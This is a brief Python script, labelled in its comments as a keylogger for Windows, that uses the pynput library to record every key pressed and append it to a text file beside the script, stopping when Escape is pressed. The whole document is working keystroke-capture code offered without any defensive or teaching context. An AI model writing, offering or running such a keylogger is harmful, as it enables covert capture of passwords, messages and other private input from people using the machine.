# Python code for keylogger 
# to be used in windows 
import os
from pynput import keyboard

# File to store the keystrokes in the current folder
output_file = os.path.join(os.path.dirname(__file__), 'output.txt')

# Function to handle key press events
def on_press(key):
    try:
        # Convert the key to a string
        keylogs = key.char if key.char else str(key)
    except AttributeError:
        # Handle special keys
        keylogs = str(key)

    # Replace Enter key with newline
    if key == keyboard.Key.enter:
        keylogs = '\n'

    # Write the keylogs to the file
    with open(output_file, 'a') as f:
        f.write(keylogs)

# Function to handle key release events (optional)
def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()